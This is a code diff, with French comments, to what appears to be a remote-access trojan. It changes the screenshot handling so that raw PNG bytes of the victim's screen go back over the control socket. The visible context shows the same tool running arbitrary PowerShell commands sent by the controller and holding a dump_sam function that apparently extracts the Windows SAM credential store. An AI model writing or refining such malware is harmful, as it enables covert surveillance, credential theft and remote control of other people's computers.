@@ -61,8 +61,8 @@ def main():
                         sock.sendall(resultat.encode())
 
                     elif commande == "screenshot":
-                        resultat = take_screenshot()
-                        sock.sendall(resultat.encode())
+                        data = take_screenshot()
+                        sock.sendall(data)
 
                     else:
                         resultat = execute_cmd(commande)
@@ -141,16 +141,15 @@ def dump_sam():
         return f"Erreur SAM: {e}"
 
 
-# prend un screenshot et le renvoie encode en base64
+# prend un screenshot et renvoie les bytes png bruts
 def take_screenshot():
     try:
         import mss
         with mss.mss() as sct:
             img = sct.grab(sct.monitors[1])
-            png = mss.tools.to_png(img.rgb, img.size)
-            return base64.b64encode(png).decode()
+            return mss.tools.to_png(img.rgb, img.size)
     except Exception as e:
-        return f"Erreur screenshot: {e}"
+        return f"Erreur screenshot: {e}".encode()
 
 
 # execute une commande powershell et renvoie la sortie
